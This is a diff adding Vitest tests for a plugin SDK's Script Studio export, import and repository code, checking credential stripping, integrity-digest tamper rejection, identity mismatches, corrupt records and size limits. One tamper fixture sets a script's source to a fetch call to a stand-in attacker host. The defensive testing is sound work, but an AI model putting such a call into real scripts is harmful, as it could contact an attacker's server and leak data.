@@ -1,10 +1,15 @@
 import { describe, expect, it } from 'vitest'
 
 import {
+  importScriptStudioExport,
   isDeclarativeRecipe,
   isVersionCompatible,
+  MemoryScriptStudioRepository,
   normalizeCompatibilityRange,
+  normalizeStudioDocument,
+  resolveStudioInstallation,
   scriptContentIntegrity,
+  serializeScriptStudioExport,
   validateAnalysisScriptDocument,
   validateLocalInstallation,
   validatePluginJsonValue,
@@ -182,5 +187,223 @@ describe('plugin SDK bounded contracts', () => {
         })),
       }).issues,
     ).toContainEqual({ path: '/references', message: 'Expected at most 128 references.' })
+  })
+
+  it('round-trips Studio records while rejecting tampering, identity drift, and corruption', async () => {
+    const document = await normalizeStudioDocument({
+      schemaVersion: 1,
+      kind: 'analysis-script',
+      id: 'studio.security-test',
+      title: 'Studio security test',
+      language: 'javascript',
+      source: 'export function main() { return null }',
+      manifest: {
+        scriptApiVersion: 1,
+        requestedCapabilities: ['workspace.read'],
+        pureJsImageCompatibility: '*',
+        workbenchCompatibility: '*',
+        entrypoint: 'main',
+        deterministic: true,
+      },
+      tests: [],
+      integrity: { algorithm: 'sha256', digest },
+    })
+    const record = {
+      schemaVersion: 1 as const,
+      id: document.id,
+      kind: document.kind,
+      document,
+      savedDocument: document,
+      editor: {
+        schemaVersion: 1 as const,
+        selectionAnchor: 0,
+        selectionHead: 0,
+        scrollTop: 0,
+        activePanel: 'problems' as const,
+      },
+      testResults: [],
+    }
+    const exported = await serializeScriptStudioExport(record)
+    await expect(importScriptStudioExport(exported)).resolves.toEqual(record)
+
+    const injected = JSON.parse(exported) as {
+      record: {
+        credentials?: { token: string }
+        editor: { credentials?: { token: string } }
+        testResults: Array<{
+          schemaVersion: 1
+          testId: string
+          status: 'passed'
+          issues: string[]
+          credentials?: { token: string }
+        }>
+      }
+    }
+    injected.record.credentials = { token: 'must-not-survive' }
+    injected.record.editor.credentials = { token: 'nested-editor-secret' }
+    injected.record.testResults = [
+      {
+        schemaVersion: 1,
+        testId: 'sanitized-result',
+        status: 'passed',
+        issues: [],
+        credentials: { token: 'nested-test-secret' },
+      },
+    ]
+    const sanitized = await importScriptStudioExport(JSON.stringify(injected))
+    expect(JSON.stringify(sanitized)).not.toMatch(
+      /must-not-survive|nested-editor-secret|nested-test-secret/u,
+    )
+    expect(sanitized.testResults).toEqual([
+      {
+        schemaVersion: 1,
+        testId: 'sanitized-result',
+        status: 'passed',
+        issues: [],
+      },
+    ])
+
+    const tampered = JSON.parse(exported) as {
+      record: { document: { source: string }; credentials?: { token: string } }
+    }
+    tampered.record.document.source = 'fetch("https://attacker.invalid")'
+    tampered.record.credentials = { token: 'must-not-survive' }
+    await expect(importScriptStudioExport(JSON.stringify(tampered))).rejects.toThrow(
+      'content integrity mismatch',
+    )
+
+    const wrongIdentity = JSON.parse(exported) as {
+      record: { savedDocument: { id: string } }
+    }
+    wrongIdentity.record.savedDocument.id = 'different-script'
+    await expect(importScriptStudioExport(JSON.stringify(wrongIdentity))).rejects.toThrow(
+      'identities do not match',
+    )
+
+    const repository = new MemoryScriptStudioRepository()
+    await repository.put(record)
+    repository.injectCorruptRecordForTest('corrupt', { schemaVersion: 99 })
+    await expect(repository.list()).resolves.toEqual([record])
+    expect(repository.warnings()).toContain('Ignored corrupt Script Studio record: corrupt')
+    repository.injectCorruptRecordForTest('forged', {
+      ...record,
+      id: 'forged',
+      document: { ...document, id: 'forged', source: 'forged content' },
+      savedDocument: { ...document, id: 'forged', source: 'forged content' },
+    })
+    await expect(repository.get('forged')).resolves.toBeUndefined()
+    expect(repository.warnings()).toContain('Ignored corrupt Script Studio record: forged')
+    await expect(importScriptStudioExport('x'.repeat(768 * 1024 + 1))).rejects.toThrow('byte limit')
+    await expect(
+      repository.put({
+        ...record,
+        document: { ...document, source: `${document.source}\n// forged without rehashing` },
+      }),
+    ).rejects.toThrow('content integrity mismatch')
+
+    await expect(
+      repository.put({
+        ...record,
+        testResults: [
+          {
+            schemaVersion: 1,
+            testId: 'oversized-result',
+            status: 'failed',
+            issues: ['x'.repeat(4_097)],
+          },
+        ],
+      }),
+    ).rejects.toThrow('invalid Script Studio record')
+
+    const mismatchedInstallation = {
+      ...record,
+      installation: {
+        schemaVersion: 1 as const,
+        document,
+        installation: {
+          schemaVersion: 1 as const,
+          pluginId: document.id,
+          pluginVersion: '1.0.0',
+          contentDigest: document.integrity.digest,
+          installedKind: 'sandboxed-script' as const,
+          permissionGrant: {
+            schemaVersion: 1 as const,
+            scriptId: document.id,
+            sourceDigest: 'b'.repeat(64),
+            grantedCapabilities: ['analysis.execute'] as const,
+            deniedCapabilities: [] as const,
+          },
+          enabled: true,
+        },
+      },
+    }
+    await expect(serializeScriptStudioExport(mismatchedInstallation)).rejects.toThrow(
+      'record is invalid',
+    )
+  })
+
+  it('replays only exact installed snapshots and warns on missing or mismatched content', async () => {
+    const document = await normalizeStudioDocument({
+      schemaVersion: 1,
+      kind: 'recipe',
+      id: 'replay.recipe',
+      version: '1.0.0',
+      title: 'Replay recipe',
+      operations: [],
+      requestedCapabilities: [],
+      compatibility: { pureJsImage: '*', workbench: '*' },
+      integrity: { algorithm: 'sha256', digest },
+    })
+    const record = {
+      schemaVersion: 1 as const,
+      id: document.id,
+      kind: document.kind,
+      document,
+      savedDocument: document,
+      editor: {
+        schemaVersion: 1 as const,
+        selectionAnchor: 0,
+        selectionHead: 0,
+        scrollTop: 0,
+        activePanel: 'problems' as const,
+      },
+      testResults: [],
+      installation: {
+        schemaVersion: 1 as const,
+        document,
+        installation: {
+          schemaVersion: 1 as const,
+          pluginId: document.id,
+          pluginVersion: '1.0.0',
+          contentDigest: document.integrity.digest,
+          installedKind: 'recipe' as const,
+          permissionGrant: {
+            schemaVersion: 1 as const,
+            scriptId: document.id,
+            sourceDigest: document.integrity.digest,
+            grantedCapabilities: [],
+            deniedCapabilities: [],
+          },
+          enabled: true,
+        },
+      },
+    }
+    const repository = new MemoryScriptStudioRepository()
+    await repository.put(record)
+    await expect(
+      resolveStudioInstallation(repository, document.id, document.integrity.digest),
+    ).resolves.toMatchObject({ status: 'exact', document })
+    await expect(
+      resolveStudioInstallation(repository, document.id, 'f'.repeat(64)),
+    ).resolves.toMatchObject({
+      status: 'mismatch',
+      warning: expect.stringContaining('content mismatch'),
+    })
+    await expect(
+      resolveStudioInstallation(repository, 'missing.recipe', digest),
+    ).resolves.toMatchObject({
+      status: 'missing',
+      warning: expect.stringContaining('is missing'),
+    })
   })
 })
